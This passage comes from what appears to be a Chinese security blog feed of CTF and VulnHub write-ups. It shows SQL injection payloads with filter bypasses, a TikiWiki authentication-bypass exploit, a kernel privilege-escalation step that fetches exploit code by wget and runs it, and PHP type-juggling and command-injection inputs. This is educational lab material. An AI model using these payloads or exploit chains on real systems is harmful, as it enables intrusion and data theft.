<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> m1ku&quot;^updatexml(1,concat(0x7e,database(),0x7e),0)#  -&gt; web_sqli</span><br><span class="line">2. m1ku&quot;<span class="operator">^</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())),<span class="number">0x7e</span>),<span class="number">0</span>)# <span class="operator">-</span><span class="operator">&gt;</span> article,flag,users</span><br><span class="line"><span class="number">3.</span> m1ku&quot;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e))#</span><br></pre></td></tr></table></figure>
<p>第3句payload其实得不到完全的字段名</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519222934.png" /></p>
<p>这时候其实有两种方式：</p>
<ol type="1">
<li>利用reverse反转一下，显示后面的字符串。（针对长度不是很长，即&lt;=60）</li>
<li>利用正则表达式</li>
</ol>
<p>第一种方式就给个payload吧： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">m1ku&quot;^extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),0x7e))#</span><br><span class="line"></span><br><span class="line">结果为：ereh_s1_galf_laer,liame,dwp,ema</span><br></pre></td></tr></table></figure></p>
<p>第二种方式的payload： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">m1ku&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1)#</span><br></pre></td></tr></table></figure></p>
<p>意思就是只显示以r开头的字段名。因此结果为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223238.png" /></p>
<p>读取flag的payload： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">m1ku&quot;^extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),0x7e))#</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223434.png" /></p>
<p>然后利用 reverse 读取后面剩余的字符串： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">m1ku&quot;^extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e))#</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223544.png" /></p>
<p>然后将前后两部分整合一下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c8c1f4cb-646d-446e-9dcd-ae971ef725f0&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该题目考察的也是二次注入，不过还需要绕过：</p>
<ul>
<li>空格过滤</li>
<li>字符串截取函数过滤</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>二次注入</tag>
        <tag>过滤空格</tag>
        <tag>过滤字符串截取函数</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU2019 Web1</title>
    <url>/2022/04/13/SWPU2019%20Web1/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
<h1 id="解题">解题</h1>
<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
<ul>
<li>Bypass information_schema;</li>
<li>无列名注入</li>
</ul>
<p>[[information_schema绕过及无列名注入]]</p>
<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
<p>（flag在<code>users</code>中）</p>
<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图）
，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
<p>最终得到flag：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>无列名注入</tag>
        <tag>Bypass information_schema</tag>
      </tags>
  </entry>
  <entry>
    <title>Tiki Writeup</title>
    <url>/2022/05/15/Tiki%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/tiki-1,525/">Tiki: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>简单</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.48</span><br><span class="line">3. sudo nmap -p22,80,139,445 -A 10.0.2.48</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515162646.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>首先根据扫描结果，存在robots.txt，里面有一个新的目录
/tiki，然后再次访问该目录，发现来到了一个页面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183247.png" /></p>
<p>左上角告诉我们，这个页面的CMS是tikiwiki，搜索一下发现存在许多可利用的漏洞，但是我们现在还不直到版本信息，接下来进行路径扫描，在/tiki/README中找到了版本信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183412.png" /></p>
<p>接下来搜索对应版本的是否存在漏洞可以利用</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183448.png" /></p>
<p>正好有一个身份认证绕过的漏洞</p>
<h1 id="get-shell">3. get shell</h1>
<p>直接使用该漏洞，只需要指定ip即可 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 48927.py 10.0.2.48</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183538.png" /></p>
<p>根据结果，admin的密码已经被溢出，接下我们使用空密码就可以登录。但是，页面不允许直接使用空密码登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183631.png" /></p>
<p>因此，使用burp抓包放过</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183721.png" /></p>
<p>成功进入后台</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183819.png" /></p>
<p>在后台测试功能点的时候，发现虽然存在文件上传（如下），但是无法利用，因为无法访问上传的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515184846.png" /></p>
<p>又继续收集信息，在 Wiki -&gt; List Pages 发现了一个</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515184920.png" /></p>
<p>红框文件里面的内容像是认证信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">silky:Agy8Y7SPJNXQzqA</span><br></pre></td></tr></table></figure></p>
<p>想到端口信息扫描的时候发现开放了22 ssh，尝试登录，成功！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185031.png" /></p>
<p>保险起见，我把另外两个文件也看了，内容为：(第三个文件就是网页的首界面)
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Hi my Name is Silky</span><br><span class="line"></span><br><span class="line">This is my third CTF. Dont give up, there is always a way to **root**!</span><br><span class="line"></span><br><span class="line">I like Cats, Frogs, Snakes and cute Doggos but thats not helpful isnt it?  </span><br><span class="line">Hmmm maybe you like something different, ... You like Hacking right?  </span><br><span class="line">I got a new CVE Number: But I constantly forget its ID :/</span><br></pre></td></tr></table></figure></p>
<p>看这个像是提示，需要使用CVE去提权到root</p>
<h1 id="权限提升">4. 权限提升</h1>
<h2 id="方法1">4.1. 方法1</h2>
<p>超简单，我查看了sudo -l
发现silky用户居然可以以root权限执行所有命令</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185357.png" /></p>
<p>那么，接下来直接切换到root即可 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185426.png" /></p>
<h2 id="方法2">4.2. 方法2</h2>
<p>根据提示可能需要使用某个CVE，因此将 linux-exploit-suggester.sh
传入到靶机，但是结果很遗憾，并没有任何可用的CVE</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185639.png" /></p>
<p>但是发现靶机的系统是Ubuntu的，而Ubuntu有一个接近万能的CVE，那就是CVE-2021-3493。使用下面的命令查看靶机是否存在gcc
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which gcc</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190025.png" /></p>
<p>因此，将漏洞利用代码传入到靶机，编译并执行即可提权到root：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. wget http://10.0.2.4:8090/exploit.c</span><br><span class="line">2. gcc exploit.c -o exp</span><br><span class="line">3. chmod +x exp</span><br><span class="line">4. ./exp</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190138.png" /></p>
<p>成功提权到root。最后进行收尾工作，读取/root目录下的flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗██╗</span><br><span class="line">██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██║</span><br><span class="line">██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║███████╗██║</span><br><span class="line">██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║╚═╝</span><br><span class="line">╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║███████║██╗</span><br><span class="line"> ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝</span><br><span class="line">                                                                                                                                </span><br><span class="line">You did it ^^</span><br><span class="line">I hope you had fun.</span><br><span class="line">Share your flag with me on Twitter: S1lky_1337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag:88d8120f434c3b4221937a8cd0668588</span><br></pre></td></tr></table></figure>
<h1 id="总结">5. 总结</h1>
<p>该靶机较简单，不过有一个坑，那就是tiki的漏洞别乱用网络上的poc，否则会导致靶机页面崩溃，像下面这样</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190414.png" /></p>
<p>并且metasploit的poc也无法使用，只能重装靶机</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190448.png" /></p>
<p>涉及的攻击方法有：</p>
<ol type="1">
<li>信息收集</li>
<li>CMS可利用漏洞</li>
<li>内核漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>信息收集</tag>
        <tag>内核漏洞</tag>
        <tag>CMS漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020 朴实无华</title>
    <url>/2022/04/07/WUSTCTF2020%20%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5D朴实无华">朴实无华</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后只有两行内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hack me  </span><br><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:3) in /var/www/html/index.php on line 4</span><br></pre></td></tr></table></figure></p>
<p>按照管理，先看一下<code>robots.txt</code>，然后查看源码，抓包。</p>
<p>查看<code>robots.txt</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131400.png" /></p>
<p>访问该文件，得到 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure></p>
<p>这一定不是flag。然后再看一下请求这个文件的数据包</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131559.png" /></p>
<p>发现了红框中的内容。直接访问该文件（如果出现乱码，改一下页面的编码即可。）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131717.png" /></p>
<h1 id="解题">解题</h1>
<p>将代码复制，整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//level 1  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123; </span><br><span class="line">	<span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];  </span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))  </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">	   <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//get flag  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123; <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123; <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>; system(<span class="variable">$get_flag</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里有3个if语句，只有最后一个才能输出flag。但是，如果不满足前面2个if语句，就会因为<code>die</code>，而直接退出程序。因此，要同时满足3个if才可以得到flag。</p>
<h2 id="intval函数绕过">intval函数绕过</h2>
<p>需要以GET方式传入一个参数<code>num</code>，并且要满足
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span></span><br></pre></td></tr></table></figure></p>
<p><code>intval</code>函数的作用是取该数字的整数部分。也就是一个数的整数部分要小于2020，但是加1之后要大于2021，这里面的跨度大于1，因此正常的一个数字是不可能实现的，因此一定存在某种绕过方法。</p>
<p>通过搜素，得到下面结果<a
href="https://www.runoob.com/php/php-intval-function.html">intval</a>：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>); <span class="comment">// 4 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;+42&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;-42&#x27;</span>); <span class="comment">// -42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>); <span class="comment">// 34 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;042&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>); <span class="comment">// 10000000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;1e10&#x27;</span>); <span class="comment">// 1 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>); <span class="comment">// 26 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>); <span class="comment">// 42000000 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>); <span class="comment">// 0 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647，32位os最大整数值</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>); <span class="comment">// 34 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>()); <span class="comment">// 0 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>)); <span class="comment">// 1 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>需要注意的是<code>intval(1e10)</code>和<code>intval('1e10')</code>，前者被当作数字，因此结果为10的10次方，而后者被当作字符串，因此取最前面的有效数字，结果位1。</p>
<p>但是，如果是<code>'1e10'+1</code>呢？</p>
<p>在PHP中，字符串和数字相加的时候也是先将字符串转为数字（取最开始的有效数字），然后再相加。但是有例外，就是<code>1e</code>开头（只要最开始是数字，然后跟一个e即可），且后面位纯数字的字符串，这回被PHP当作是科学计数法的数字。</p>
<p>此时来回答<code>'1e10'+1</code>。根据上面的说明，那么这个执行的结果为<code>10000000001</code>。</p>
<p>可以利用这个特性传入<code>'2e4'</code>，此时 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="string">&#x27;2e4&#x27;</span>) = <span class="number">2</span> &lt; <span class="number">2020</span></span><br><span class="line">intval(<span class="string">&#x27;2e4&#x27;</span> + <span class="number">1</span>) = <span class="number">20001</span> &gt; <span class="number">2021</span></span><br></pre></td></tr></table></figure></p>
<p>因此payload如下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=&#x27;2e4&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407133950.png" /></p>
<p>发现并没有绕过，猜测可能后台代码默认将我们的输入转为了字符串。因此，尝试
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4</span><br></pre></td></tr></table></figure></p>
<p>此时，成功绕过！</p>
<h2 id="md5-弱类型比较绕过">MD5 弱类型比较绕过</h2>
<p>需要以GET方式传入参数<code>md5</code>，并且满足： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$md5</span>==md5(<span class="variable">$md5</span>)</span><br></pre></td></tr></table></figure></p>
<p>与上题的原理类似。如果<code>$md5=0e[后面是纯数字]</code>，并且<code>md5($md5)=0e[后面是纯数字]</code>，那么此时两者进行比较的流程：</p>
<ol type="1">
<li>会被当作是科学计数法表示的数字，因为0的几次方都是0，因此两边的值都是0</li>
<li><code>0==0</code> 结果为True</li>
</ol>
<p>写一个脚本跑一下满足这种条件的值： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">    valBase = <span class="string">&#x27;0e&#x27;</span>  </span><br><span class="line">    val = valBase + <span class="built_in">str</span>(i)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;checking <span class="subst">&#123;val&#125;</span> now:&quot;</span>, end=<span class="string">&#x27;\t&#x27;</span>)  </span><br><span class="line">    h = hashlib.md5()  </span><br><span class="line">    h.update(val.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    valMD5 = h.hexdigest()  </span><br><span class="line">    <span class="keyword">if</span> valMD5[<span class="number">0</span>:<span class="number">2</span>] == valBase <span class="keyword">and</span> (valMD5[<span class="number">2</span>:]).isdigit():  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nfind it! val: &quot;</span> + val)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;And md5(val): &quot;</span> + valMD5)  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;No!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>结果为<code>0e215962017</code>，所以输入如下payload：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017</span><br></pre></td></tr></table></figure></p>
<p>成功绕过第二个if！</p>
<h2 id="命令执行">命令执行</h2>
<p>需要以GET方式传入参数<code>get_flag</code>，并且要满足：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>) 为 真</span><br></pre></td></tr></table></figure></p>
<p>并且<code>cat</code>被过滤了。也就是我们输入的命令不能带有空格和<code>cat</code>。这其实比较容易。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=ls # 查看当前目录文件</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407135323.png" /></p>
<p>flag应该就在那个巨长的名字的文件里面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=tac&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag # 读取flag</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407135447.png" /></p>
<h1 id="总结">总结</h1>
<p>本题其实考场的就是PHP中科学计数法的数字和字符串的关系。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>PHP之科学计数法</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020 颜值成绩查询</title>
